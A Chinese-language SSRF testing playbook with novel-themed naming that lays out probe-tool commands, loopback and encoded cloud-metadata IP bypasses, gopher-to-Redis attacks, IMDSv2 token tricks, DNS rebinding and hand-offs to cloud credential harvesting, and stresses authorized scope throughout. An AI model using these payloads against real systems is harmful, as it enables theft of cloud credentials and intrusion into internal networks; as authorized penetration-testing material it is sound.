# 大爱仙尊 SSRF 作业手法

> 杀招：`定仙游`  
> 工具：`python3 炼蛊房/ssrf_probe.py`  
> 云链：`传承/定仙游·云骨.md`  
> 专卡：MRBS / MLflow webhook 仍走各自手法。

目标须在 scope。元数据 IP 是基础设施，**不把 `169.254.169.254` 扩进 targets**。

---

## 1. 立刻跑

```bash
python3 炼蛊房/ssrf_probe.py doctor
python3 炼蛊房/ssrf_probe.py scan --base https://授权站 --case <案>
python3 炼蛊房/ssrf_probe.py test --url https://授权站/api/fetch --param url --case <案>
python3 炼蛊房/ssrf_probe.py oob --url https://授权站/api/fetch --param url \
  --callback https://你的OOB --case <案>
```

产物：`案卷/ssrf/ssrf_scan.json`。  
L1：端点吃 URL。L2：回显内网 banner / passwd / 元数据指纹。L3：临时云凭证 + 认角色（`GetCallerIdentity`），写只用 marker。

---

## 2. 四刀

1. **找入口** — `url` / `avatar` / `callback` / `notify_url` / 截图 / 预览 / webhook  
2. **打回环** — `127.0.0.1`、`127.1`、`0.0.0.0`、`[::1]`、十进制 `2130706433`  
3. **打元数据** — AWS/阿里/腾讯/华为表见云元数据手法。`2852039166` / `0xa9fea9fe` 是 `169.254.169.254`  
4. **认协议** — GET 打不到再 `file://` / `gopher://`（Redis）。IMDSv2 要 PUT `X-aws-ec2-metadata-token-ttl-seconds`；纯 GET `/latest/api/token` 常 405，**405 也是活**，换能带头的 SSRF 再要凭证

盲 SSRF：必须 OOB（DNS/HTTP 回你的 callback）。没回包不算阴性。

DNS 重绑定：校验和真正请求各解析一次就会绕过字符串黑名单（Craft CMS 2026 同类）。本库不内置公网 rebind 服务，授权实验自备。

---

## 3. 命中后交接

| 拿到 | 走 |
|------|----|
| AMI / RAM / `access_token` | `cloud-metadata-harvesting` · 阿里云 AK-SK 链 |
| Redis PONG / 6379 | `契柜·无门.md`（gopher） |
| Nacos :8848 | 先版本再打，禁止跳过直接 Jasypt |
| 只扫到 80/8080 | 记端口，换 webhook/支付 callback 参数 |

禁止：SSRF 命中就写 heapdump 结案。那是另一张卡。
